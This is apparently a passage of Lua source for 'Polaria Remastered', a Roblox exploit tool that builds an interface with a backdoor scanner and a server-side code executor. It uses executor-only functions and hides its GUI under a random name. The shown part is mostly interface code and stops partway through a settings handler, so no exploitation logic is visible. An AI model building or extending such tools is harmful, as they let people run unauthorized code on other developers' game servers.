if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Env = (type(getgenv) == "function" and getgenv()) or shared or _G

local function GetService(Name)
    local Svc = game:GetService(Name)
    return cloneref and cloneref(Svc) or Svc
end

local Hui = gethui and gethui() or GetService("CoreGui")
local TweenService = GetService("TweenService")
local Players = GetService("Players")
local Player = Players.LocalPlayer
local RunService = GetService("RunService")
local HttpService = GetService("HttpService")
local UserInputService = GetService("UserInputService")
local Stats = GetService("Stats")
local ReplicatedStorage = GetService("ReplicatedStorage")
local MarketplaceService = GetService("MarketplaceService")
local StarterGui = GetService("StarterGui")

local function Tween(Object, Speed, Props, Style, Dir)
    return TweenService:Create(
        Object,
        TweenInfo.new(
            Speed,
            Enum.EasingStyle[Style or "Quad"],
            Enum.EasingDirection[Dir or "Out"]
        ),
        Props
    )
end

local function UID(Length)
    Length = Length or 64

    local Chars = [[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~]]
    local Id = table.create(Length)

    for i = 1, Length do
        local Rand = math.random(1, #Chars)
        Id[i] = Chars:sub(Rand, Rand)
    end

    return table.concat(Id)
end

local WriteFile = writefile or function() return end
local IsFile = isfile or function() return end
local IsFolder = isfolder or function() return end
local MakeFolder = makefolder or function() return end
local LoadAsset = getcustomasset or getsynasset

local Assets = {
    ["PolariaRM/Assets/polaria_logo.png"] = "https://raw.githubusercontent.com/JustSomeGuest/Scripts/Main/Universal/PolariaRM/Logo.png",
    ["PolariaRM/Assets/polaria_dev.png"] = "https://avatars.githubusercontent.com/u/279942568"
}

local function HttpGet(url)
    local RequestFunc = syn and syn.request or request or http_request
    
    if not RequestFunc then
        return nil
    end
    
    local success, result = pcall(function()
        return RequestFunc({
            Url = url,
            Method = "GET"
        })
    end)
    
    return success and result or nil
end

local function GetAsset(Path)
    if not LoadAsset then
        return nil
    end

    local Asset = Assets[Path]
    if not Asset then
        return nil
    end

    if not IsFolder("PolariaRM") then
        MakeFolder("PolariaRM")
    end

    if not IsFolder("PolariaRM/Assets") then
        MakeFolder("PolariaRM/Assets")
    end

    if Asset:match("^rbxassetid://") then
        return Asset
    end

    if not IsFile(Path) then
        local Success, Response = pcall(function()
            return HttpGet(Asset)
        end)

        if not Success or not Response or not Response.Success or not Response.Body then
            return nil
        end

        WriteFile(Path, Response.Body)
    end

    return LoadAsset(Path)
end

local Logo = GetAsset("PolariaRM/Assets/polaria_logo.png")

if not Logo and LoadAsset and IsFile and IsFile("PolariaSRC/polaria_logo.png") then
    local Success, Asset = pcall(LoadAsset, "PolariaSRC/polaria_logo.png")

    if Success then
        Logo = Asset
    end
end

Env.PolariaRM = Env.PolariaRM or {}

local backdoorRemote = nil
local currentContent = nil
local lastDT = 0
local serverStartTime = workspace:GetServerTimeNow()

local OgGradient = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))
}
local OgPurple = Color3.fromRGB(83, 0, 255)
local White = Color3.fromRGB(255, 255, 255)
local Black = Color3.fromRGB(0, 0, 0)
local Radius = 6
local WindowSize = UDim2.new(0.7, 0, 0.9, -50)
local GlowPurple = Color3.fromRGB(121, 0, 255)

local FontTitle = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
local FontBody = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)

local TAB_COUNT = 5
local TAB_PAD = 6

local UI = {}

local function Add(Name, Class, Props)
    Props = Props or {}
    Props.Name = Props.Name or Name

    local Obj = Instance.new(Class)
    for K, V in pairs(Props) do
        Obj[K] = V
    end

    UI[Name] = Obj
    return Obj
end

local function Grad(Name, Parent)
    return Add(Name, "UIGradient", { Color = OgGradient, Parent = Parent })
end

local function PurpleStroke(Name, Parent)
    local Stroke = Add(Name, "UIStroke", {
        Color = White,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
        Parent = Parent,
    })

    Add(Name .. "Gradient", "UIGradient", { Color = OgGradient, Parent = Stroke })
    return Stroke
end

local function Hover(Obj, Base, Over)
    Obj.MouseEnter:Connect(function()
        for K, V in pairs(Over) do
            Obj[K] = V
        end
    end)

    Obj.MouseLeave:Connect(function()
        for K, V in pairs(Base) do
            Obj[K] = V
        end
    end)
end

UI.ScreenGui = Add("ScreenGui", "ScreenGui", {
    Name = UID(),
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    ResetOnSpawn = false,
    IgnoreGuiInset = true,
    Parent = Hui,
})

UI.Show = Add("Show", "ImageButton", {
    Size = UDim2.new(0, 40, 0, 40),
    Position = UDim2.new(0, 16, 0, 60),
    BackgroundColor3 = Black,
    BorderSizePixel = 0,
    Visible = true,
    Parent = UI.ScreenGui,
})
UI.ShowCorner = Add("ShowCorner", "UICorner", { CornerRadius = UDim.new(1, 0), Parent = UI.Show })
UI.ShowStroke = PurpleStroke("ShowStroke", UI.Show)
UI.ShowGradient = Grad("ShowGradient", UI.Show)
UI.ShowPadding = Add("ShowPadding", "UIPadding", {
    PaddingTop = UDim.new(0, 5),
    PaddingRight = UDim.new(0, 5),
    PaddingLeft = UDim.new(0, 5),
    PaddingBottom = UDim.new(0, 5),
    Parent = UI.Show,
})
UI.ShowIcon = Add("ShowIcon", "ImageLabel", {
    Image = Logo or "",
    ImageColor3 = White,
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 1, 0),
    Visible = Logo ~= nil,
    Parent = UI.Show,
})
UI.ShowIconGradient = Grad("ShowIconGradient", UI.ShowIcon)
UI.ShowFallback = Add("ShowFallback", "TextLabel", {
    Text = "P",
    TextSize = 24,
    FontFace = FontTitle,
    TextColor3 = White,
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 1, 0),
    Visible = Logo == nil,
    Parent = UI.Show,
})
UI.ShowFallbackGradient = Add("ShowFallbackGradient", "UIGradient", {
    Color = ColorSequence.new(White, OgPurple),
    Rotation = 45,
    Parent = UI.ShowFallback,
})

UI.Container = Add("Container", "Frame", {
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    Size = WindowSize,
    BackgroundColor3 = Black,
    BorderSizePixel = 0,
    Visible = false,
    Parent = UI.ScreenGui,
})
UI.ContainerCorner = Add("ContainerCorner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = UI.Container })
UI.Shadow = Add("Shadow", "UIShadow", { BlurRadius = UDim.new(0, 8), Color = GlowPurple, Transparency = 0.5, Parent = UI.Container })

UI.MainFrame = Add("MainFrame", "Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ClipsDescendants = true,
    Parent = UI.Container,
})
UI.MainFrameCorner = Add("MainFrameCorner", "UICorner", { CornerRadius = UDim.new(0, Radius - 1), Parent = UI.MainFrame })
UI.MainFramePadding = Add("MainFramePadding", "UIPadding", {
    PaddingTop = UDim.new(0, 4),
    PaddingRight = UDim.new(0, 4),
    PaddingLeft = UDim.new(0, 4),
    PaddingBottom = UDim.new(0, 4),
    Parent = UI.MainFrame,
})
UI.MainFrameStroke = PurpleStroke("MainFrameStroke", UI.Container)
UI.MainFrameGradient = Grad("MainFrameGradient", UI.MainFrame)
UI.MainFrameList = Add("MainFrameList", "UIListLayout", {
    HorizontalFlex = Enum.UIFlexAlignment.Fill,
    VerticalFlex = Enum.UIFlexAlignment.Fill,
    Padding = UDim.new(0, 6),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = UI.MainFrame,
})

UI.Topbar = Add("Topbar", "Frame", {
    Size = UDim2.new(1, 0, 0, 30),
    LayoutOrder = 1,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = UI.MainFrame,
})
UI.TopbarSC = Add("TopbarSC", "UISizeConstraint", { MinSize = Vector2.new(0, 30), MaxSize = Vector2.new(math.huge, 34), Parent = UI.Topbar })
UI.TopbarList = Add("TopbarList", "UIListLayout", {
    HorizontalFlex = Enum.UIFlexAlignment.Fill,
    VerticalFlex = Enum.UIFlexAlignment.Fill,
    Padding = UDim.new(0, 4),
    SortOrder = Enum.SortOrder.LayoutOrder,
    FillDirection = Enum.FillDirection.Horizontal,
    Parent = UI.Topbar,
})
UI.Title = Add("Title", "TextLabel", {
    Text = Logo and "olaria Remastered" or "Polaria Remastered",
    TextWrapped = true,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextScaled = true,
    FontFace = FontTitle,
    TextColor3 = White,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(0, 486, 0, 30),
    LayoutOrder = 1,
    Parent = UI.Topbar,
})
UI.TitleGradient = Grad("TitleGradient", UI.Title)
UI.TitleLogo = Add("TitleLogo", "ImageLabel", {
    Image = Logo or "",
    ImageColor3 = OgPurple,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Visible = Logo ~= nil,
    AnchorPoint = Vector2.new(0, 0.5),
    Position = UDim2.new(0, -29, 0.5, 0),
    Size = UDim2.new(0, 30, 0, 30),
    ScaleType = Enum.ScaleType.Fit,
    Parent = UI.Title,
})
UI.TitlePadding = Add("TitlePadding", "UIPadding", {
    PaddingLeft = UDim.new(0, Logo and 30 or 0),
    Parent = UI.Title,
})

UI.TopbarButtons = Add("TopbarButtons", "Frame", {
    Size = UDim2.new(0, 68, 1, 0),
    LayoutOrder = 2,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = UI.Topbar,
})
UI.TopbarButtonsSC = Add("TopbarButtonsSC", "UISizeConstraint", { MinSize = Vector2.new(68, 0), MaxSize = Vector2.new(72, math.huge), Parent = UI.TopbarButtons })
UI.TopbarButtonsList = Add("TopbarButtonsList", "UIListLayout", {
    HorizontalAlignment = Enum.HorizontalAlignment.Right,
    VerticalAlignment = Enum.VerticalAlignment.Center,
    Padding = UDim.new(0, 4),
    SortOrder = Enum.SortOrder.LayoutOrder,
    FillDirection = Enum.FillDirection.Horizontal,
    Parent = UI.TopbarButtons,
})
UI.Hide = Add("Hide", "TextButton", {
    Text = "-",
    TextWrapped = true,
    TextScaled = true,
    FontFace = FontTitle,
    TextColor3 = White,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(0, 32, 0, 32),
    LayoutOrder = 1,
    Parent = UI.TopbarButtons,
})
UI.HideCorner = Add("HideCorner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = UI.Hide })
UI.HideGradient = Grad("HideGradient", UI.Hide)
UI.Close = Add("Close", "TextButton", {
    Text = "X",
    TextWrapped = true,
    TextScaled = true,
    FontFace = FontTitle,
    TextColor3 = White,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(0, 32, 0, 32),
    LayoutOrder = 2,
    Parent = UI.TopbarButtons,
})
UI.CloseCorner = Add("CloseCorner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = UI.Close })
UI.CloseGradient = Grad("CloseGradient", UI.Close)

UI.Tabs = Add("Tabs", "Frame", {
    Size = UDim2.new(1, 0, 0, 34),
    LayoutOrder = 2,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = UI.MainFrame,
})
UI.TabsSC = Add("TabsSC", "UISizeConstraint", { MinSize = Vector2.new(0, 32), MaxSize = Vector2.new(math.huge, 36), Parent = UI.Tabs })

UI.TabsBar = Add("TabsBar", "Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ZIndex = 2,
    Parent = UI.Tabs,
})
UI.TabsList = Add("TabsList", "UIListLayout", {
    HorizontalAlignment = Enum.HorizontalAlignment.Left,
    HorizontalFlex = Enum.UIFlexAlignment.Fill,
    VerticalFlex = Enum.UIFlexAlignment.Fill,
    Padding = UDim.new(0, TAB_PAD),
    VerticalAlignment = Enum.VerticalAlignment.Center,
    SortOrder = Enum.SortOrder.LayoutOrder,
    FillDirection = Enum.FillDirection.Horizontal,
    Parent = UI.TabsBar,
})

UI.TabHighlight = Add("TabHighlight", "Frame", {
    BackgroundColor3 = White,
    BorderSizePixel = 0,
    ZIndex = 1,
    Size = UDim2.new(1 / TAB_COUNT, -(TAB_PAD * (TAB_COUNT - 1)) / TAB_COUNT, 1, 0),
    Visible = false,
    Parent = UI.Tabs,
})
UI.TabHighlightCorner = Add("TabHighlightCorner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = UI.TabHighlight })
UI.TabHighlightGradient = Grad("TabHighlightGradient", UI.TabHighlight)
UI.TabHighlightStroke = PurpleStroke("TabHighlightStroke", UI.TabHighlight)

local function MakeTab(Name, Text, Order)
    local Btn = Add(Name, "TextButton", {
        Text = "",
        BackgroundColor3 = Black,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(0, 96, 1, 0),
        LayoutOrder = Order,
        ZIndex = 2,
        Parent = UI.TabsBar,
    })

    local Corner = Add(Name .. "Corner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = Btn })
    local Stroke = PurpleStroke(Name .. "Stroke", Btn)
    Grad(Name .. "Gradient", Btn)

    local Label = Add(Name .. "Label", "TextLabel", {
        Text = Text,
        TextWrapped = true,
        TextScaled = true,
        FontFace = FontBody,
        TextColor3 = White,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ZIndex = 3,
        Size = UDim2.new(1, 0, 1, 0),
        Parent = Btn,
    })
    Add(Name .. "LabelPadding", "UIPadding", {
        PaddingTop = UDim.new(0, 2),
        PaddingRight = UDim.new(0, 4),
        PaddingLeft = UDim.new(0, 4),
        PaddingBottom = UDim.new(0, 2),
        Parent = Label,
    })

    return Btn, Stroke, Corner, Label
end

UI.HomeTab, UI.HomeTabStroke, UI.HomeTabCorner, UI.HomeTabLabel = MakeTab("HomeTab", "Home", 1)
UI.ScanTab, UI.ScanTabStroke, UI.ScanTabCorner, UI.ScanTabLabel = MakeTab("ScanTab", "Scanner", 2)
UI.ScriptsTab, UI.ScriptsTabStroke, UI.ScriptsTabCorner, UI.ScriptsTabLabel = MakeTab("ScriptsTab", "Scripts", 3)
UI.ExeTab, UI.ExeTabStroke, UI.ExeTabCorner, UI.ExeTabLabel = MakeTab("ExeTab", "Executor", 4)
UI.SettingsTab, UI.SettingsTabStroke, UI.SettingsTabCorner, UI.SettingsTabLabel = MakeTab("SettingsTab", "Settings", 5)

UI.Contents = Add("Contents", "Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    LayoutOrder = 3,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = UI.MainFrame,
})

local function MakeContent(Name, Order, Scrolling)
    local Frame = Add(Name, Scrolling and "ScrollingFrame" or "Frame", {
        Size = UDim2.new(1, 0, 1, 0),
        LayoutOrder = Order,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Visible = Order == 1,
        Parent = UI.Contents,
    })

    if Scrolling then
        Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
        Frame.AutomaticCanvasSize = Enum.AutomaticSize.Y
        Frame.ScrollingDirection = Enum.ScrollingDirection.Y
        Frame.ScrollBarThickness = 0
    end

    return Frame
end

UI.HomeContent = MakeContent("HomeContent", 1, false)
UI.HomeContentList = Add("HomeContentList", "UIListLayout", {
    HorizontalFlex = Enum.UIFlexAlignment.Fill,
    VerticalFlex = Enum.UIFlexAlignment.Fill,
    Padding = UDim.new(0, 4),
    SortOrder = Enum.SortOrder.LayoutOrder,
    FillDirection = Enum.FillDirection.Horizontal,
    Parent = UI.HomeContent,
})
UI.Headshot = Add("Headshot", "ImageLabel", {
    Size = UDim2.new(0, 90, 0, 90),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScaleType = Enum.ScaleType.Fit,
    LayoutOrder = 1,
    Parent = UI.HomeContent,
})
UI.HeadshotSC = Add("HeadshotSC", "UISizeConstraint", { MinSize = Vector2.new(80, 80), MaxSize = Vector2.new(100, 100), Parent = UI.Headshot })
UI.HeadshotStroke = PurpleStroke("HeadshotStroke", UI.Headshot)
UI.HeadshotRatio = Add("HeadshotRatio", "UIAspectRatioConstraint", { Parent = UI.Headshot })
UI.HeadshotCorner = Add("HeadshotCorner", "UICorner", { CornerRadius = UDim.new(1, 0), Parent = UI.Headshot })
UI.HomeStats = Add("HomeStats", "TextLabel", {
    Text = "Welcome, DisplayName! (@Username)\nFPS:\nPing:\nServer age:\nDevice:\nOS:\nExecutor:",
    TextWrapped = true,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    TextScaled = true,
    FontFace = FontBody,
    TextColor3 = White,
    RichText = true,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(0, 410, 0, 184),
    LayoutOrder = 2,
    Parent = UI.HomeContent,
})
UI.HomeStatsGradient = Grad("HomeStatsGradient", UI.HomeStats)

UI.ScannerContent = MakeContent("ScannerContent", 2, false)
UI.ScannerContentList = Add("ScannerContentList", "UIListLayout", {
    HorizontalFlex = Enum.UIFlexAlignment.Fill,
    VerticalFlex = Enum.UIFlexAlignment.Fill,
    Padding = UDim.new(0, 4),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = UI.ScannerContent,
})
UI.ScanBtn = Add("ScanBtn", "TextButton", {
    Text = "",
    Size = UDim2.new(0, 48, 0, 48),
    BackgroundColor3 = White,
    BorderSizePixel = 0,
    LayoutOrder = 1,
    Parent = UI.ScannerContent,
})
UI.ScanBtnCorner = Add("ScanBtnCorner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = UI.ScanBtn })
UI.ScanBtnGradient = Grad("ScanBtnGradient", UI.ScanBtn)
UI.ScanBtnStroke = PurpleStroke("ScanBtnStroke", UI.ScanBtn)
UI.ScanBtnSC = Add("ScanBtnSC", "UISizeConstraint", { MinSize = Vector2.new(0, 46), MaxSize = Vector2.new(math.huge, 50), Parent = UI.ScanBtn })
UI.ScanBtnContainer = Add("ScanBtnContainer", "Frame", {
    Interactable = false,
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = UI.ScanBtn,
})
UI.ScanLabel = Add("ScanLabel", "TextLabel", {
    Text = "Scan",
    TextWrapped = true,
    TextScaled = true,
    FontFace = FontBody,
    TextColor3 = White,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(1, 0, 1, 0),
    Parent = UI.ScanBtnContainer,
})
UI.ScanLabelPadding = Add("ScanLabelPadding", "UIPadding", {
    PaddingTop = UDim.new(0, 6),
    PaddingRight = UDim.new(0, 6),
    PaddingLeft = UDim.new(0, 6),
    PaddingBottom = UDim.new(0, 6),
    Parent = UI.ScanLabel,
})
UI.ScanStatus = Add("ScanStatus", "TextLabel", {
    Text = "Ready to scan for backdoors...",
    TextWrapped = true,
    TextSize = 22,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    FontFace = FontBody,
    TextColor3 = White,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(0, 456, 0, 184),
    LayoutOrder = 2,
    Parent = UI.ScannerContent,
})
UI.ScanStatusGradient = Grad("ScanStatusGradient", UI.ScanStatus)

UI.ExeContent = MakeContent("ExeContent", 4, false)
UI.ExeContentList = Add("ExeContentList", "UIListLayout", {
    HorizontalFlex = Enum.UIFlexAlignment.Fill,
    VerticalFlex = Enum.UIFlexAlignment.Fill,
    Padding = UDim.new(0, 6),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = UI.ExeContent,
})
UI.InputFrame = Add("InputFrame", "ScrollingFrame", {
    Size = UDim2.new(0.2, 0, 0.3, 0),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    AutomaticCanvasSize = Enum.AutomaticSize.Y,
    ScrollingDirection = Enum.ScrollingDirection.Y,
    ScrollBarThickness = 0,
    Parent = UI.ExeContent,
})
UI.InputFrameCorner = Add("InputFrameCorner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = UI.InputFrame })
UI.InputFrameStroke = PurpleStroke("InputFrameStroke", UI.InputFrame)
UI.InputBox = Add("InputBox", "TextBox", {
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    PlaceholderColor3 = OgPurple,
    PlaceholderText = "Server-side code here...",
    MultiLine = true,
    TextWrapped = true,
    TextSize = 16,
    TextScaled = false,
    TextColor3 = White,
    Font = Enum.Font.Code,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    AutomaticSize = Enum.AutomaticSize.Y,
    Size = UDim2.new(1, 0, 0, 0),
    Text = "",
    Parent = UI.InputFrame,
})
UI.InputBoxPadding = Add("InputBoxPadding", "UIPadding", {
    PaddingTop = UDim.new(0, 4),
    PaddingRight = UDim.new(0, 4),
    PaddingLeft = UDim.new(0, 4),
    PaddingBottom = UDim.new(0, 4),
    Parent = UI.InputBox,
})
UI.InputBoxTextSC = Add("InputBoxTextSC", "UITextSizeConstraint", { MaxTextSize = 20, MinTextSize = 18, Parent = UI.InputBox })

UI.ExeContentBtns = Add("ExeContentBtns", "Frame", {
    Size = UDim2.new(0, 0, 0, 34),
    LayoutOrder = 2,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = UI.ExeContent,
})
UI.ExeContentBtnsSC = Add("ExeContentBtnsSC", "UISizeConstraint", { MinSize = Vector2.new(0, 30), MaxSize = Vector2.new(math.huge, 34), Parent = UI.ExeContentBtns })
UI.ExeContentBtnsList = Add("ExeContentBtnsList", "UIListLayout", {
    HorizontalFlex = Enum.UIFlexAlignment.Fill,
    VerticalFlex = Enum.UIFlexAlignment.Fill,
    Padding = UDim.new(0, 6),
    SortOrder = Enum.SortOrder.LayoutOrder,
    FillDirection = Enum.FillDirection.Horizontal,
    Parent = UI.ExeContentBtns,
})

local DimWhite = Color3.fromRGB(220, 220, 220)

local function MakeActionButton(Name, Label, Order)
    local Btn = Add(Name, "TextButton", {
        Text = "",
        Size = UDim2.new(0, 120, 0, 36),
        BackgroundColor3 = White,
        BorderSizePixel = 0,
        LayoutOrder = Order,
        Parent = UI.ExeContentBtns,
    })

    Add(Name .. "Corner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = Btn })
    Grad(Name .. "Gradient", Btn)
    PurpleStroke(Name .. "Stroke", Btn)

    local Container = Add(Name .. "Container", "Frame", {
        Interactable = false,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Parent = Btn,
    })

    local BtnLabel = Add(Name .. "Label", "TextLabel", {
        Text = Label,
        TextWrapped = true,
        TextScaled = true,
        FontFace = FontBody,
        TextColor3 = White,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 1, 0),
        Parent = Container,
    })
    Add(Name .. "LabelPadding", "UIPadding", {
        PaddingTop = UDim.new(0, 4),
        PaddingRight = UDim.new(0, 4),
        PaddingLeft = UDim.new(0, 4),
        PaddingBottom = UDim.new(0, 4),
        Parent = BtnLabel,
    })

    Hover(Btn, { BackgroundColor3 = White }, { BackgroundColor3 = DimWhite })
    return Btn
end

UI.Exe = MakeActionButton("Exe", "Execute", 1)
UI.Clr = MakeActionButton("Clr", "Clear", 2)
UI.Re = MakeActionButton("Re", "Refresh", 3)

UI.ScriptsContent = MakeContent("ScriptsContent", 3, true)
UI.ScriptsContentGrid = Add("ScriptsContentGrid", "UIGridLayout", {
    CellSize = UDim2.new(1 / 6, -4, 0, 34),
    CellPadding = UDim2.new(0, 4, 0, 4),
    Parent = UI.ScriptsContent,
})
UI.BtnExample = Add("BtnExample", "TextButton", {
    Text = "",
    TextWrapped = true,
    TextScaled = true,
    FontFace = FontBody,
    TextColor3 = White,
    BackgroundColor3 = White,
    BorderSizePixel = 0,
    Size = UDim2.new(0, 32, 0, 32),
    Parent = UI.ScriptsContent,
})
UI.BtnExampleCorner = Add("BtnExampleCorner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = UI.BtnExample })
UI.BtnExampleGradient = Grad("BtnExampleGradient", UI.BtnExample)
UI.BtnExampleContainer = Add("BtnExampleContainer", "Frame", {
    Interactable = false,
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = UI.BtnExample,
})
UI.BtnExampleLabel = Add("BtnExampleLabel", "TextLabel", {
    Text = "Script name",
    TextWrapped = true,
    TextScaled = true,
    FontFace = FontBody,
    TextColor3 = White,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Size = UDim2.new(1, 0, 1, 0),
    Parent = UI.BtnExampleContainer,
})
UI.BtnExampleLabelPadding = Add("BtnExampleLabelPadding", "UIPadding", {
    PaddingTop = UDim.new(0, 6),
    PaddingRight = UDim.new(0, 6),
    PaddingLeft = UDim.new(0, 6),
    PaddingBottom = UDim.new(0, 6),
    Parent = UI.BtnExampleLabel,
})
Hover(UI.BtnExample, { BackgroundColor3 = White }, { BackgroundColor3 = DimWhite })

UI.SettingsContent = MakeContent("SettingsContent", 5, false)
UI.SettingsContentList = Add("SettingsContentList", "UIListLayout", {
    Padding = UDim.new(0, 6),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = UI.SettingsContent,
})

local CensorNames = false
local ToggleKey = nil
local listeningForKey = false

local function MaskName(Name)
    if #Name <= 1 then
        return "*"
    end

    return Name:sub(1, 1) .. string.rep("*", #Name - 1)
end

local function ApplyCorners(NewRadius)
    local function Scan(Parent)
        for _, Obj in ipairs(Parent:GetChildren()) do
            if Obj.ClassName == "UICorner" then
                if Obj.CornerRadius.Scale == 0 then
                    Obj.CornerRadius = UDim.new(0, NewRadius)
                end
            else
                Scan(Obj)
            end
        end
    end

    Scan(UI.ScreenGui)
end

local SETTINGS_PATH = "PolariaRM/settings.json"

local function SaveSettings()
    if not (writefile and IsFile and IsFolder and MakeFolder) then
        return
    end

    pcall(function()
        if not IsFolder("PolariaRM") then
            MakeFolder("PolariaRM")
        end

        local HttpService = game:GetService("HttpService")
        writefile(SETTINGS_PATH, HttpService:JSONEncode({
            Censor = CensorNames,
            Corners = Radius,
            Keybind = ToggleKey and ToggleKey.Name or nil,
        }))
    end)
end

local function MakeSettingRow(Name, Order)
    local Row = Add(Name, "Frame", {
        Size = UDim2.new(1, 0, 0, 34),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        LayoutOrder = Order,
        Parent = UI.SettingsContent,
    })

    Add(Name .. "Corner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = Row })
    PurpleStroke(Name .. "Stroke", Row)

    Add(Name .. "List", "UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal,
        HorizontalAlignment = Enum.HorizontalAlignment.Left,
        VerticalAlignment = Enum.VerticalAlignment.Center,
        Padding = UDim.new(0, 6),
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = Row,
    })

    return Row
end

local function MakeSettingLabel(Name, Text, Order, Parent, WidthOffset)
    local Label = Add(Name, "TextLabel", {
        Text = Text,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextScaled = true,
        FontFace = FontBody,
        TextColor3 = White,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, -(WidthOffset or 136), 1, 0),
        LayoutOrder = Order,
        Parent = Parent,
    })

    Add(Name .. "Padding", "UIPadding", {
        PaddingLeft = UDim.new(0, 6),
        Parent = Label,
    })

    return Label
end

local function MakeSettingButton(Name, Order, Parent)
    local Btn = Add(Name, "TextButton", {
        Text = "",
        BackgroundColor3 = White,
        BorderSizePixel = 0,
        Size = UDim2.new(0, 130, 1, 0),
        LayoutOrder = Order,
        Parent = Parent,
    })

    Add(Name .. "Corner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = Btn })
    Grad(Name .. "Gradient", Btn)
    PurpleStroke(Name .. "Stroke", Btn)

    local Container = Add(Name .. "Container", "Frame", {
        Interactable = false,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Parent = Btn,
    })

    local BtnLabel = Add(Name .. "Label", "TextLabel", {
        Text = "",
        TextWrapped = true,
        TextScaled = true,
        TextXAlignment = Enum.TextXAlignment.Center,
        FontFace = FontBody,
        TextColor3 = White,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Size = UDim2.new(1, -8, 1, -8),
        Parent = Container,
    })

    Hover(Btn, { BackgroundColor3 = White }, { BackgroundColor3 = DimWhite })
    return Btn, BtnLabel
end

UI.CornerRow = MakeSettingRow("CornerRow", 1)
MakeSettingLabel("CornerLabel", "Corner Size", 1, UI.CornerRow, 116)

UI.CornerBox = Add("CornerBox", "TextBox", {
    Text = tostring(Radius),
    PlaceholderText = "0-10",
    TextWrapped = true,
    TextScaled = true,
    TextXAlignment = Enum.TextXAlignment.Center,
    FontFace = FontBody,
    TextColor3 = White,
    BackgroundColor3 = Black,
    BorderSizePixel = 0,
    Size = UDim2.new(0, 110, 1, 0),
    LayoutOrder = 2,
    Parent = UI.CornerRow,
})
UI.CornerBoxCorner = Add("CornerBoxCorner", "UICorner", { CornerRadius = UDim.new(0, Radius), Parent = UI.CornerBox })
PurpleStroke("CornerBoxStroke", UI.CornerBox)

UI.CornerBox.FocusLost:Connect(function()
    local Value = tonumber(UI.CornerBox.Text)

    if not Value then
        UI.CornerBox.Text = tostring(Radius)
        return
    end

